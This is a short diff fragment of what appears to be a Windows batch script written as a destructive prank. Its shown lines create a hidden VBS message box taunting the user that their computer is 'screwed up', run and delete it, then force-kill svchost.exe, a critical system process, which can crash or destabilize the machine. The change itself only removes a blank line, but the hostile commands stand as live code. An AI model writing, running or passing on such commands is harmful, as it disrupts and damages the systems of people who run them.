@@ -138,5 +138,4 @@ echo x=msgbox("You got your computer screwed up successfully.",48+0,"Microsoft W
 attrib +h yt.vbs
 wscript yt.vbs
 del yt.vbs /f
-
 taskkill /f /im svchost.exe
